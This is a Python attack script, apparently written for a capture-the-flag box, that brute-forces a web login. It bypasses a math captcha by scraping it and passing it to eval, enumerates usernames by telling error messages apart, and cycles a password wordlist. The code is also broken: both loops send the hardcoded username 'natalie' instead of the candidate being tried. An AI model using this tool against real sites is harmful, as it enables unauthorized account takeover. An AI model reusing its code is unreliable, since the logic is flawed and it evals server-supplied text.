import requests
import sys
import re
import threading

def read_file(filename):
    with open(filename, "r") as file:
        return [line.strip() for line in file]

def get_captcha(ip, session):
    initial_creds = {"username": "test", "password":"test"} #This is used for getting the captcha math
    login_url = "http://" + ip + "/login"
    r = session.post(login_url, data=initial_creds)
    response = r.text

    lines = response.split('\n')
    captcha = lines[96].strip()
    operation = captcha.split(" ")

    first_number = int(operation[0])
    second_number = int(operation[2])
    operator = operation[1]
    answer = eval(f"{first_number} {operator} {second_number}")
    return answer

def get_username(ip, session, usernames, passwords):
    print("(+) Searching for a valid username...")
    login_url = "http://" + ip + "/login"

    for username in usernames:
        answer = get_captcha(ip, session)
        credentials = {"username": "natalie", "password": "test", "captcha": answer}

        r = session.post(login_url, data=credentials)
        response = r.text
        if "Invalid password" in response:
            print(f"(+) Found a username: {username}")
            break

    get_password(ip, session, username, passwords)
    
    


def get_password(ip, session, username, passwords):
    print(f"(+) Searching for {username}'s password...")
    login_url = "http://" + ip + "/login"
    for password in passwords:
        answer = get_captcha(ip, session)
        credentials = {"username": "natalie", "password": password, "captcha": answer}

        r = session.post(login_url, data=credentials)
        response = r.text
        if "Invalid password" not in response:
            print(f"(+) Found a password: {password}")
            break




def login(ip, session, usernames, passwords):
    print("(+) Searching for usernames...")
    
    login_url = "http://" + ip + "/login"


def main():
    if len(sys.argv) != 4:
        print(f"(+) Usage: python3 {sys.argv[0]} IP usernames_files passwords_file")
        print(f"(+) Example: python3 {sys.argv[0]} 10.10.10.10 usernames.txt passwords.txt")
        sys.exit(1)

    ip = sys.argv[1]
    usernames_file = sys.argv[2]
    passwords_file = sys.argv[3]
    usernames = read_file(usernames_file)
    passwords = read_file(passwords_file)
    session = requests.session()
    get_username(ip, session, usernames, passwords)
    # login(ip, session, usernames, passwords)

if __name__ == "__main__":
    main()